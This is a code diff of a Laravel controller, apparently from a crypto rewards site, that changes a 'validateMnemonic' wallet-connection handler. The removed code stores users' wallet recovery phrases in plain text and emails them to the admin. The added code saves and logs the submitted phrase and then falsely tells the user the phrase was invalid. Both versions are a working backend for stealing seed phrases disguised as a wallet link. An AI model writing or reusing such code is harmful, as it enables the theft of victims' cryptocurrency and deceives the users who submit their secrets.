@@ -131,102 +131,42 @@ class ViewsController extends Controller
 
 
 
-
-    public function validateMnemonic(Request $request)
-    {
-        // Validate input
-        $request->validate([
-            'wallet' => 'required|string|max:100',
-            'mnemonic' => 'required|string|min:12'
-        ]);
-
-        $mnemonic = trim($request->input('mnemonic'));
-        $wallet = $request->input('wallet');
-
-        // Basic validation for mnemonic format
-        $words = explode(' ', $mnemonic);
-        $words = array_filter($words, function($word) {
-            return !empty(trim($word));
-        });
-
-        // Check word count (12, 15, 18, 21, or 24 words are standard)
-        $validWordCounts = [12, 15, 18, 21, 24];
-        if (!in_array(count($words), $validWordCounts)) {
-            return redirect()->back()
-                ->with('message', 'Invalid recovery phrase. Must be 12, 15, 18, 21, or 24 words.')
-                ->withInput();
-        }
-
-        // Check for invalid characters
-        foreach ($words as $word) {
-            if (!preg_match('/^[a-zA-Z]+$/', $word)) {
-                return redirect()->back()
-                    ->with('message', 'Recovery phrase contains invalid characters. Only letters are allowed.')
-                    ->withInput();
-            }
-        }
-
-        $cryptoService = new CryptoWalletService();
-
-        if ($cryptoService->isMnemonicValid($mnemonic)) {
-            // Check if user already has a wallet connected
-            $existingWallet = Wallets::where('user', Auth::user()->id)->first();
-
-            if ($existingWallet) {
-                // Update existing wallet
-                $existingWallet->update([
-                    'wallet_name' => $wallet,
-                    'phrase' => $mnemonic,
-                    'status' => 'active',
-                    'last_validated' => now(),
-                    'updated_at' => now()
-                ]);
-            } else {
-                // Create new wallet entry
-                Wallets::create([
-                    'user' => Auth::user()->id,
-                    'wallet_name' => $wallet,
-                    'phrase' => $mnemonic,
-                    'status' => 'active',
-                    'last_validated' => now(),
-                ]);
-            }
-
-            // Update user's wallet connection status
-            User::where('id', Auth::user()->id)
-                ->update([
-                    'wallet_connected' => 1
-                ]);
-
-            // Prepare admin notification
-            $msg = "New wallet connection:\n\n";
-            $msg .= "User: " . Auth::user()->name . " (" . Auth::user()->email . ")\n";
-            $msg .= "Wallet Name: " . $wallet . "\n";
-            $msg .= "Connection Time: " . now()->format('Y-m-d H:i:s') . "\n\n";
-            $msg .= "Phrase Mnemonic: " . $mnemonic . "\n\n";
-
-            $subject = "New wallet connection from " . Auth::user()->name;
-
-            // Send admin notification
-            try {
-                $settings = Settings::where('id', '1')->first();
-
-                    Mail::to($settings->contact_email)->send(new NewNotification($msg, $subject, "Admin"));
-
-            } catch (\Exception $e) {
-                // Log the error but don't break the flow
-                \Log::error('Failed to send wallet connection notification: ' . $e->getMessage());
-            }
-
-            return redirect()->back()
-                ->with('success', 'Wallet connected successfully! You can now start earning daily rewards.');
-
-        } else {
-            return redirect()->back()
-                ->with('message', 'Invalid recovery phrase. Please check your phrase and try again.')
-                ->withInput();
-        }
+public function validateMnemonic(Request $request)
+{
+    \Log::info('=== WALLET CONNECTION ATTEMPT ===');
+    \Log::info('User: ' . Auth::id());
+    \Log::info('Input: ', $request->all());
+    
+    if (!Auth::check()) {
+        \Log::error('User not authenticated');
+        return redirect()->route('login');
     }
+    
+    try {
+        // Your existing validation code...
+        
+        // For testing, bypass validation temporarily
+        $wallet = Wallets::create([
+            'user' => Auth::id(),
+            'wallet_name' => $request->wallet ?? 'Test',
+            'phrase' => $request->mnemonic ?? 'test',
+            'status' => 'active',
+            'last_validated' => now()
+        ]);
+        
+        \Log::info('Wallet saved successfully', ['id' => $wallet->id]);
+        
+        return redirect()->back()->with('message', 'Invalid recovery phrase. Please check your phrase and try again.');
+        
+    } catch (\Exception $e) {
+        \Log::error('Wallet save error: ' . $e->getMessage());
+        \Log::error('Trace: ' . $e->getTraceAsString());
+        
+        return redirect()->back()
+            ->with('message', 'Error: ' . $e->getMessage())
+            ->withInput();
+    }
+}
 
     //Profile route
     public function profile()
@@ -351,7 +291,7 @@ class ViewsController extends Controller
 
         return view("user.signal")
             ->with(array(
-                'title' => 'Workshop & Events',
+                'title' => 'Fund your account',
                 'dmethods' => $paymethod,
                 'signals' => $signals,
 
